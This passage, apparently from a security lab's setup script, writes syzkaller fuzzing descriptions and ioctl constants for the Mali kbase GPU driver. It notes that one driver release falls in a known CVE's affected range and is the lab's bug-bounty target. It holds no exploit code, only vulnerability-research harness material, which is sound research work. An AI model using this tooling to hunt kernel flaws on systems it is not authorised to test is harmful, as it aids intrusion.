#   UK 11.33). GET_PROFILING_CONTROLS does not exist in r41p0 headers.
# - Added (r41p0 JM ioctls absent from dev_bifrost.txt): VERSION_CHECK
#   _RESERVED(52), KINSTR_JM_FD(51), KINSTR_PRFCNT_SETUP(53),
#   CONTEXT_PRIORITY_CHECK(54), SET_LIMITED_CORE_COUNT(55),
#   KINSTR_PRFCNT_ENUM_INFO(56).
# - Excluded as unreachable in THIS kernel config (documented, not silently):
#   CINSTR_GWT_START/STOP/DUMP (needs CONFIG_MALI_CINSTR_GWT, unset),
#   TLSTREAM_STATS/EXTRA_TYPE/MY_IOCTL/TEST_TYPE (MALI_UNIT_TEST only),
#   CS_* queue/fault ioctls + MEM_ALLOC_EX + READ_USER_PAGE (MALI_USE_CSF).
#
# Union-style ioctl structs: kbase passes in/out views of one buffer. Fields
# that alias the kernel's out-view slot are typed as the out value and marked
# (inout), e.g. MEM_ALLOC@8 = commit_pages(in)/gpu_va(out); the executor then
# copyouts the kernel-returned GPU VA into the gpu_addr resource, enabling
# alloc -> use -> free chaining while keeping the modeled size == the exact
# release _IOC_SIZE. See evidence/06 for the offset mapping table.
#
# Consts in dev_mali_r41p0.txt.const were extracted from the r41p0 headers:
#   bin/syz-extract -arch amd64 -sourcedir/-builddir builds/linux-4.19.320-r41p0 \
#       -includedirs harness/release_uapi/r41p0-01eac0 dev_mali_r41p0.txt
# and cross-checked against a C dumper compiled from the same headers.
# Keep this file `meta noextract` so `make extract` cannot clobber the
# release-matched consts with values from an unrelated kernel tree.
meta noextract


include <gpu/arm/midgard/mali_base_kernel.h>
include <gpu/arm/midgard/mali_base_common_kernel.h>
include <gpu/arm/midgard/jm/mali_base_jm_kernel.h>
include <gpu/arm/midgard/mali_kbase_ioctl.h>
include <gpu/arm/midgard/mali_kbase_hwcnt_reader.h>
include <uapi/linux/fcntl.h>
include <linux/types.h>

resource fd_bifrost[fd]
resource gpu_addr[int64]: BASEP_MEM_INVALID_HANDLE, BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE
resource user_addr[int64]: -1
resource fd_fence[fd]
resource fd_hwcnt[fd]

openat$bifrost(fd const[AT_FDCWD], file ptr[in, string["/dev/bifrost"]], flags flags[open_flags], mode const[0]) fd_bifrost
# Our NO_MALI build registers miscdevice mali0 -> /dev/mali0
openat$mali(fd const[AT_FDCWD], file ptr[in, string["/dev/mali0"]], flags flags[open_flags], mode const[0]) fd_bifrost

# GPU VA mmap: kbase's vm_pgoff encodes the region cookie (Phase D smoke:
# mmap(offset=cookie) materializes the SAME_VA region).
mmap$bifrost(addr const[0], len len[addr], prot flags[mmap_prot], flags flags[mmap_flags], fd fd_bifrost, offset fileoff) user_addr
munmap$bifrost(addr user_addr, len intptr)

ioctl$KBASE_IOCTL_JOB_SUBMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_JOB_SUBMIT], arg ptr[in, kbase_ioctl_job_submit])
ioctl$KBASE_IOCTL_POST_TERM(fd fd_bifrost, cmd const[KBASE_IOCTL_POST_TERM], arg const[0])
ioctl$KBASE_IOCTL_SOFT_EVENT_UPDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_SOFT_EVENT_UPDATE], arg ptr[in, kbase_ioctl_soft_event_update])
ioctl$KBASE_IOCTL_VERSION_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_VERSION_CHECK_RESERVED(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK_RESERVED], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_SET_FLAGS(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_FLAGS], arg ptr[in, kbase_ioctl_set_flags])
ioctl$KBASE_IOCTL_GET_GPUPROPS(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_GPUPROPS], arg ptr[inout, kbase_ioctl_get_gpuprops])
ioctl$KBASE_IOCTL_MEM_ALLOC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALLOC], arg ptr[inout, kbase_ioctl_mem_alloc])
# in-view only: out.value aliases the gpu_addr@0 slot; observing it would
# poison the gpu_addr resource with non-address query values.
ioctl$KBASE_IOCTL_MEM_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_QUERY], arg ptr[in, kbase_ioctl_mem_query])
ioctl$KBASE_IOCTL_MEM_FREE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FREE], arg ptr[in, kbase_ioctl_mem_free])
ioctl$KBASE_IOCTL_HWCNT_READER_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_READER_SETUP], arg ptr[in, kbase_ioctl_hwcnt_reader_setup]) fd_hwcnt
ioctl$KBASE_IOCTL_HWCNT_SET(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_SET], arg ptr[inout, kbase_ioctl_hwcnt_values])
ioctl$KBASE_IOCTL_DISJOINT_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_DISJOINT_QUERY], arg ptr[out, kbase_ioctl_disjoint_query])
ioctl$KBASE_IOCTL_GET_DDK_VERSION(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_DDK_VERSION], arg ptr[inout, kbase_ioctl_get_ddk_version])
ioctl$KBASE_IOCTL_MEM_JIT_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT], arg ptr[in, kbase_ioctl_mem_jit_init])
ioctl$KBASE_IOCTL_MEM_EXEC_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_EXEC_INIT], arg ptr[in, kbase_ioctl_mem_exec_init])
ioctl$KBASE_IOCTL_MEM_SYNC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_SYNC], arg ptr[in, kbase_ioctl_mem_sync])
# in-view only: out.offset aliases gpu_addr@0 (not an address).
ioctl$KBASE_IOCTL_MEM_FIND_CPU_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_CPU_OFFSET], arg ptr[in, kbase_ioctl_mem_find_cpu_offset])
ioctl$KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET], arg ptr[inout, kbase_ioctl_mem_find_gpu_start_and_offset])
ioctl$KBASE_IOCTL_GET_CONTEXT_ID(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CONTEXT_ID], arg ptr[out, kbase_ioctl_get_context_id])
ioctl$KBASE_IOCTL_TLSTREAM_ACQUIRE(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_ACQUIRE], arg ptr[in, kbase_ioctl_tlstream_acquire])
ioctl$KBASE_IOCTL_TLSTREAM_FLUSH(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_FLUSH], arg const[0])
ioctl$KBASE_IOCTL_MEM_COMMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_COMMIT], arg ptr[in, kbase_ioctl_mem_commit])
ioctl$KBASE_IOCTL_MEM_ALIAS(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALIAS], arg ptr[inout, kbase_ioctl_mem_alias])
ioctl$KBASE_IOCTL_MEM_IMPORT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_IMPORT], arg ptr[inout, kbase_ioctl_mem_import])
ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FLAGS_CHANGE], arg ptr[in, kbase_ioctl_mem_flags_change])
ioctl$KBASE_IOCTL_STREAM_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_STREAM_CREATE], arg ptr[in, kbase_ioctl_stream_create]) fd_fence
ioctl$KBASE_IOCTL_FENCE_VALIDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_FENCE_VALIDATE], arg ptr[in, kbase_ioctl_fence_validate])
ioctl$KBASE_IOCTL_MEM_PROFILE_ADD(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_PROFILE_ADD], arg ptr[in, kbase_ioctl_mem_profile_add])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_MAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_MAP], arg ptr[in, kbase_ioctl_sticky_resource_map])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_UNMAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_UNMAP], arg ptr[in, kbase_ioctl_sticky_resource_unmap])
ioctl$KBASE_IOCTL_KINSTR_JM_FD(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_JM_FD], arg ptr[in, kbase_kinstr_jm_fd])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO], arg ptr[inout, kbase_ioctl_kinstr_prfcnt_enum_info])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_SETUP], arg ptr[in, kbase_ioctl_kinstr_prfcnt_setup])
# in-view only (32B): out view aliases the request_flags/paddings slots.
ioctl$KBASE_IOCTL_GET_CPU_GPU_TIMEINFO(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CPU_GPU_TIMEINFO], arg ptr[in, kbase_ioctl_get_cpu_gpu_timeinfo])
ioctl$KBASE_IOCTL_CONTEXT_PRIORITY_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_CONTEXT_PRIORITY_CHECK], arg ptr[inout, kbase_ioctl_context_priority_check])
ioctl$KBASE_IOCTL_SET_LIMITED_CORE_COUNT(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_LIMITED_CORE_COUNT], arg ptr[in, kbase_ioctl_set_limited_core_count])

# hwcnt reader fd (returned by HWCNT_READER_SETUP) — mali_kbase_hwcnt_reader.h.
ioctl$KBASE_HWCNT_READER_GET_HWVER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_HWVER], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_SIZE(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_SIZE], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_DUMP(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DUMP], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_CLEAR(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_CLEAR], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER], arg ptr[out, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES], arg ptr[out, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER], arg ptr[in, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES], arg ptr[in, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_SET_INTERVAL(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_SET_INTERVAL], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_ENABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_ENABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_DISABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DISABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_API_VERSION(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION], arg ptr[in, int32])
# same nr 0xFF, size-encoded newer variant (release drift axis)
ioctl$KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES], arg ptr[in, kbase_hwcnt_reader_api_version])

type base_atom_id int8

base_jd_udata {
	blob	array[int64, 2]
}

base_dependency {
	atom_id			base_atom_id
	dependency_type	flags[base_jd_dep_type, int8]
}

base_jd_atom_v2 {
	jc			int64
	udata			base_jd_udata
	extres_list		int64
	nr_extres		int16
	jit_id			array[int8, 2]
	pre_dep			array[base_dependency, 2]
	atom_number		base_atom_id
	prio			flags[base_jd_prio, int8]
	device_nr		int8
	jobslot			int8
	core_req		flags[base_jd_core_req, int32]
	renderpass_id	int8
	padding			array[const[0, int8], 7]
}

kbase_ioctl_job_submit {
	addr		ptr64[in, array[base_jd_atom_v2]]
	nr_atoms	len[addr, int32]
# sizeof(base_jd_atom_v2)
	stride		const[56, int32]
}

kbase_ioctl_version_check {
	major	int16
	minor	int16
}

kbase_ioctl_set_flags {
	create_flags	flags[basep_context_create_kernel_flags, int32]
}

kbase_ioctl_get_gpuprops {
	buffer	ptr64[out, array[int8]]
	size	len[buffer, int32]
	flags	const[0, int32]
}

kbase_ioctl_mem_alloc {
# C union (32B): in {va_pages, commit_pages, extension, flags};
# out {flags@0, gpu_va@8}. @8 is modeled as the out view (gpu_va) so
# returned cookies populate gpu_addr (input value lands in commit_pages).
	va_pages	int64
	gpu_va		gpu_addr	(inout)
	extent		int64
	flags		flags[base_mem_alloc_flags, int64]
}

kbase_ioctl_mem_query {
	gpu_addr	gpu_addr
	query		flags[kbase_ioctl_mem_query_flags, int64]
}

kbase_ioctl_mem_free {
	gpu_addr	gpu_addr
}

kbase_ioctl_hwcnt_reader_setup {
	buffer_count	int32
	fe_bm			int32
	shader_bm		int32
	tiler_bm		int32
	mmu_l2_bm		int32
}

kbase_ioctl_hwcnt_values {
	data	ptr64[out, array[int8]]
	size	len[data, int32]
	padding	const[0, int32]
}

kbase_ioctl_disjoint_query {
	counter	int32
}

kbase_ioctl_get_ddk_version {
	version_buffer	ptr64[out, array[int8]]
	size			len[version_buffer, int32]
	padding			const[0, int32]
}

kbase_ioctl_mem_jit_init {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
	phys_pages		int64
}

kbase_ioctl_mem_exec_init {
	va_pages	int64
}

kbase_ioctl_mem_sync {
	handle		gpu_addr
	user_addr	user_addr
	size		int64
	type		flags[base_syncset_op_flags, int8]
	padding		array[const[0, int8], 7]
}

kbase_ioctl_mem_find_cpu_offset {
	gpu_addr	gpu_addr
	cpu_addr	user_addr
	size		int64
}

kbase_ioctl_mem_find_gpu_start_and_offset {
# union (16B): in {gpu_addr, size}; out {start@0, offset@8}. @0 doubles as
# out.start (a live region base) -> inout gpu_addr for chaining.
	gpu_addr	gpu_addr	(inout)
	size		int64		(inout)
}

kbase_ioctl_get_context_id {
	id	int32
}

kbase_ioctl_tlstream_acquire {
	flags	int32
}

kbase_ioctl_mem_commit {
	gpu_addr	gpu_addr
	pages		int64
}

kbase_ioctl_mem_alias {
# union (32B): in {flags, stride, nents, aliasing_info};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	gpu_va		gpu_addr	(inout)
	nents		len[aliasing_info, int64]
	aliasing_info	ptr64[in, array[base_mem_aliasing_info]]
}

base_mem_aliasing_info {
	handle	gpu_addr
	offset	int64
	length	int64
}

kbase_ioctl_mem_import {
# union (24B): in {flags, phandle, type, padding};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	phandle		gpu_addr	(inout)
	type		flags[base_mem_import_type, int32]
	padding		const[0, int32]
}

kbase_ioctl_mem_flags_change {
	gpu_va	gpu_addr
	flags	flags[base_mem_alloc_flags, int64]
	mask	int64
}

kbase_ioctl_stream_create {
	name	array[int8, 32]
}

kbase_ioctl_fence_validate {
	fd	fd_fence
}

kbase_ioctl_mem_profile_add {
	buffer	ptr64[in, array[int8]]
	len		len[buffer, int32]
	padding	const[0, int32]
}

kbase_ioctl_sticky_resource_map {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_sticky_resource_unmap {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_soft_event_update {
	event		gpu_addr
	new_status	int32
	flags		const[0, int32]
}

kbase_ioctl_get_cpu_gpu_timeinfo {
	request_flags	flags[base_timerequest_allowed_flags, int32]
	paddings		array[const[0, int8], 28]
}

kbase_kinstr_jm_fd {
	count	int16
	padding	array[const[0, int8], 6]
}

kbase_ioctl_kinstr_prfcnt_enum_info {
	info_item_size	int32
	info_item_count	int32
	info_list_ptr	ptr64[out, array[int8]]
}

kbase_ioctl_kinstr_prfcnt_setup {
	request_item_count	int32
	request_item_size	int32
	requests_ptr		ptr64[in, array[int8]]
}

kbase_ioctl_context_priority_check {
	priority	int8
}

kbase_ioctl_set_limited_core_count {
	max_core_count	int8
}

# r41p0 has TWO generations of the buffer ioctls on the SAME nr (0x20/0x21),
# distinguished by _IOC_SIZE: legacy (16B, offsetof-cycles) and *_WITH_CYCLES
# (32B full metadata). Model both, release-exact.
kbase_hwcnt_reader_metadata_legacy {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
}

kbase_hwcnt_reader_api_version {
	version	int32
	features int32
}

kbase_hwcnt_reader_metadata_cycles {
	top			int64
	shader_cores	int64
}

kbase_hwcnt_reader_metadata {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
	cycles		kbase_hwcnt_reader_metadata_cycles
}

base_jd_dep_type = BASE_JD_DEP_TYPE_INVALID, BASE_JD_DEP_TYPE_DATA, BASE_JD_DEP_TYPE_ORDER
base_jd_prio = BASE_JD_PRIO_MEDIUM, BASE_JD_PRIO_HIGH, BASE_JD_PRIO_LOW
base_jd_core_req = BASE_JD_REQ_DEP, BASE_JD_REQ_FS, BASE_JD_REQ_CS, BASE_JD_REQ_T, BASE_JD_REQ_CF, BASE_JD_REQ_V, BASE_JD_REQ_FS_AFBC, BASE_JD_REQ_EVENT_COALESCE, BASE_JD_REQ_COHERENT_GROUP, BASE_JD_REQ_PERMON, BASE_JD_REQ_EXTERNAL_RESOURCES, BASE_JD_REQ_SOFT_JOB, BASE_JD_REQ_ONLY_COMPUTE, BASE_JD_REQ_SPECIFIC_COHERENT_GROUP, BASE_JD_REQ_EVENT_ONLY_ON_FAILURE, BASE_JD_REQ_SKIP_CACHE_START, BASE_JD_REQ_SKIP_CACHE_END, BASE_JD_REQ_JOB_SLOT, BASE_JD_REQ_START_RENDERPASS, BASE_JD_REQ_END_RENDERPASS
kbase_ioctl_mem_query_flags = KBASE_MEM_QUERY_COMMIT_SIZE, KBASE_MEM_QUERY_VA_SIZE, KBASE_MEM_QUERY_FLAGS
base_syncset_op_flags = BASE_SYNCSET_OP_MSYNC, BASE_SYNCSET_OP_CSYNC
# 0x400000-0x2000000 are individual bits of BASE_MEM_GROUP_ID_MASK
# (r41p0 has no BASE_MEM_TILER_ALIGN_TOP_EXTENT_MAX_PAGES — ChromeOS-bifrost only)
base_mem_alloc_flags = BASE_MEM_PROT_CPU_RD, BASE_MEM_PROT_CPU_WR, BASE_MEM_PROT_GPU_RD, BASE_MEM_PROT_GPU_WR, BASE_MEM_PROT_GPU_EX, BASEP_MEM_PERMANENT_KERNEL_MAPPING, BASE_MEM_GPU_VA_SAME_4GB_PAGE, BASEP_MEM_NO_USER_FREE, BASE_MEM_RESERVED_BIT_8, BASE_MEM_GROW_ON_GPF, BASE_MEM_COHERENT_SYSTEM, BASE_MEM_COHERENT_LOCAL, BASE_MEM_CACHED_CPU, BASE_MEM_SAME_VA, BASE_MEM_NEED_MMAP, BASE_MEM_COHERENT_SYSTEM_REQUIRED, BASE_MEM_PROTECTED, BASE_MEM_DONT_NEED, BASE_MEM_IMPORT_SHARED, BASE_MEM_RESERVED_BIT_19, BASE_MEM_TILER_ALIGN_TOP, BASE_MEM_UNCACHED_GPU, 0x400000, 0x800000, 0x1000000, 0x2000000, BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP, BASE_MEM_FLAG_MAP_FIXED
base_mem_import_type = BASE_MEM_IMPORT_TYPE_INVALID, BASE_MEM_IMPORT_TYPE_UMM, BASE_MEM_IMPORT_TYPE_USER_BUFFER
# 0x08-0x20 are individual bits of BASEP_CONTEXT_MMU_GROUP_ID_MASK
basep_context_create_kernel_flags = BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED, 0x8, 0x10, 0x20, 0x40
base_timerequest_allowed_flags = BASE_TIMEINFO_MONOTONIC_FLAG, BASE_TIMEINFO_TIMESTAMP_FLAG, BASE_TIMEINFO_CYCLE_COUNTER_FLAG, BASE_TIMEINFO_KERNEL_SOURCE_FLAG, BASE_TIMEINFO_USER_SOURCE_FLAG
__PL_06__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r41p0.txt" "b513686f4d89c67d08eb88c1d36125f4b8509eff8f60caad9c25a65d632fdc91"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r41p0.txt.const")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r41p0.txt.const" <<'__PL_07__'
# Code generated by syz-sysgen. DO NOT EDIT.
arches = amd64, arm64
AT_FDCWD = 18446744073709551516
BASEP_MEM_INVALID_HANDLE = 0
BASEP_MEM_NO_USER_FREE = 128
BASEP_MEM_PERMANENT_KERNEL_MAPPING = 32
BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE = 16384
BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED = 2
BASE_JD_DEP_TYPE_DATA = 1
BASE_JD_DEP_TYPE_INVALID = 0
BASE_JD_DEP_TYPE_ORDER = 2
BASE_JD_PRIO_HIGH = 1
BASE_JD_PRIO_LOW = 2
BASE_JD_PRIO_MEDIUM = 0
BASE_JD_REQ_CF = 8
BASE_JD_REQ_COHERENT_GROUP = 64
BASE_JD_REQ_CS = 2
BASE_JD_REQ_DEP = 0
BASE_JD_REQ_END_RENDERPASS = 524288
BASE_JD_REQ_EVENT_COALESCE = 32
BASE_JD_REQ_EVENT_ONLY_ON_FAILURE = 4096
BASE_JD_REQ_EXTERNAL_RESOURCES = 256
BASE_JD_REQ_FS = 1
BASE_JD_REQ_FS_AFBC = 8192
BASE_JD_REQ_JOB_SLOT = 131072
BASE_JD_REQ_ONLY_COMPUTE = 1024
BASE_JD_REQ_PERMON = 128
BASE_JD_REQ_SKIP_CACHE_END = 65536
BASE_JD_REQ_SKIP_CACHE_START = 32768
BASE_JD_REQ_SOFT_JOB = 512
BASE_JD_REQ_SPECIFIC_COHERENT_GROUP = 2048
BASE_JD_REQ_START_RENDERPASS = 262144
BASE_JD_REQ_T = 4
BASE_JD_REQ_V = 16
BASE_MEM_CACHED_CPU = 4096
BASE_MEM_COHERENT_LOCAL = 2048
BASE_MEM_COHERENT_SYSTEM = 1024
BASE_MEM_COHERENT_SYSTEM_REQUIRED = 32768
BASE_MEM_DONT_NEED = 131072
BASE_MEM_FLAG_MAP_FIXED = 134217728
BASE_MEM_GPU_VA_SAME_4GB_PAGE = 64
BASE_MEM_GROW_ON_GPF = 512
BASE_MEM_IMPORT_SHARED = 262144
BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP = 67108864
BASE_MEM_IMPORT_TYPE_INVALID = 0
BASE_MEM_IMPORT_TYPE_UMM = 2
BASE_MEM_IMPORT_TYPE_USER_BUFFER = 3
BASE_MEM_NEED_MMAP = 16384
BASE_MEM_PROTECTED = 65536
BASE_MEM_PROT_CPU_RD = 1
BASE_MEM_PROT_CPU_WR = 2
BASE_MEM_PROT_GPU_EX = 16
BASE_MEM_PROT_GPU_RD = 4
BASE_MEM_PROT_GPU_WR = 8
BASE_MEM_RESERVED_BIT_19 = 524288
BASE_MEM_RESERVED_BIT_8 = 256
BASE_MEM_SAME_VA = 8192
BASE_MEM_TILER_ALIGN_TOP = 1048576
BASE_MEM_UNCACHED_GPU = 2097152
BASE_SYNCSET_OP_CSYNC = 2
BASE_SYNCSET_OP_MSYNC = 1
BASE_TIMEINFO_CYCLE_COUNTER_FLAG = 4
BASE_TIMEINFO_KERNEL_SOURCE_FLAG = 1073741824
BASE_TIMEINFO_MONOTONIC_FLAG = 1
BASE_TIMEINFO_TIMESTAMP_FLAG = 2
BASE_TIMEINFO_USER_SOURCE_FLAG = 2147483648
KBASE_HWCNT_READER_CLEAR = 1074052625
KBASE_HWCNT_READER_DISABLE_EVENT = 1074052673
KBASE_HWCNT_READER_DUMP = 1074052624
KBASE_HWCNT_READER_ENABLE_EVENT = 1074052672
KBASE_HWCNT_READER_GET_API_VERSION = 1074052863
KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES = 1074315007
KBASE_HWCNT_READER_GET_BUFFER = 2148580896
KBASE_HWCNT_READER_GET_BUFFER_SIZE = 2147794433
KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES = 2149629472
KBASE_HWCNT_READER_GET_HWVER = 2147794432
KBASE_HWCNT_READER_PUT_BUFFER = 1074839073
KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES = 1075887649
KBASE_HWCNT_READER_SET_INTERVAL = 1074052656
KBASE_IOCTL_CONTEXT_PRIORITY_CHECK = 3221323830
KBASE_IOCTL_DISJOINT_QUERY = 2147778572
KBASE_IOCTL_FENCE_VALIDATE = 1074036761
KBASE_IOCTL_GET_CONTEXT_ID = 2147778577
KBASE_IOCTL_GET_CPU_GPU_TIMEINFO = 3223355442
KBASE_IOCTL_GET_DDK_VERSION = 1074823181
KBASE_IOCTL_GET_GPUPROPS = 1074823171
KBASE_IOCTL_HWCNT_READER_SETUP = 1075085320
KBASE_IOCTL_HWCNT_SET = 1074823200
KBASE_IOCTL_JOB_SUBMIT = 1074823170
KBASE_IOCTL_KINSTR_JM_FD = 3221782579
KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO = 3222306872
KBASE_IOCTL_KINSTR_PRFCNT_SETUP = 3222306873
KBASE_IOCTL_MEM_ALIAS = 3223355413
KBASE_IOCTL_MEM_ALLOC = 3223355397
KBASE_IOCTL_MEM_COMMIT = 1074823188
KBASE_IOCTL_MEM_EXEC_INIT = 1074298918
KBASE_IOCTL_MEM_FIND_CPU_OFFSET = 3222831120
KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET = 3222306847
KBASE_IOCTL_MEM_FLAGS_CHANGE = 1075347479
KBASE_IOCTL_MEM_FREE = 1074298887
KBASE_IOCTL_MEM_IMPORT = 3222831126
KBASE_IOCTL_MEM_JIT_INIT = 1075347470
KBASE_IOCTL_MEM_PROFILE_ADD = 1074823195
KBASE_IOCTL_MEM_QUERY = 3222306822
KBASE_IOCTL_MEM_SYNC = 1075871759
KBASE_IOCTL_POST_TERM = 32772
KBASE_IOCTL_SET_FLAGS = 1074036737
KBASE_IOCTL_SET_LIMITED_CORE_COUNT = 1073840183
KBASE_IOCTL_SOFT_EVENT_UPDATE = 1074823196
KBASE_IOCTL_STICKY_RESOURCE_MAP = 1074823197
KBASE_IOCTL_STICKY_RESOURCE_UNMAP = 1074823198
KBASE_IOCTL_STREAM_CREATE = 1075871768
KBASE_IOCTL_TLSTREAM_ACQUIRE = 1074036754
KBASE_IOCTL_TLSTREAM_FLUSH = 32787
KBASE_IOCTL_VERSION_CHECK = 3221520384
KBASE_IOCTL_VERSION_CHECK_RESERVED = 3221520436
KBASE_MEM_QUERY_COMMIT_SIZE = 1
KBASE_MEM_QUERY_FLAGS = 3
KBASE_MEM_QUERY_VA_SIZE = 2
__NR_ioctl = amd64:16, arm64:29
__NR_mmap = amd64:9, arm64:222
__NR_munmap = amd64:11, arm64:215
__NR_openat = amd64:257, arm64:56
__PL_07__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r41p0.txt.const" "cf31621374f3e17e77fae07de2452233b01445f4be5a001e06c95e4512596368"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0.txt")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0.txt" <<'__PL_08__'
# syzkaller syscall descriptions for the Mali "kbase" UAPI.
#
# RELEASE-MATCHED to: r36p0-01eac0 (Bifrost/Valhall DDK, UAPI UK ~11.25 era,
# POST the CVE-2021-28663 fix), JOB MANAGER mode (MALI_USE_CSF == 0) as built
# by this lab's default combo (KERNEL_VERSION=5.10.30 + DRIVER_VERSION=
# r36p0-01eac0 + DRIVER_FAMILY=bifrost, NO_MALI dummy model, banner
# "Kernel DDK version r36p0-01eac0"). r36p0-01eac0 is inside the documented
# CVE-2022-38181 affected range (Bifrost/Valhall <= r38p1 + r39p0; fixed <=
# r41p0), making it the lab's bounty-program vehicle.
#
# Provenance & verification:
# - Derived field-by-field from dev_mali_r41p0.txt (Phase E, evidence/06) and
#   cross-checked against this release's pristine uapi headers under
#   harness/release_uapi/r36p0 (regenerated from the staged/downloaded
#   BX304L01B-SW-99002-r36p0-01eac0.tar by gen_release_uapi).
# - r36p0 vs r41p0 delta (the ONLY differences from the r41p0 description):
#   * + MEM_JIT_INIT_10_2 (8B) and MEM_JIT_INIT_11_5 (16B) — same nr 14 as
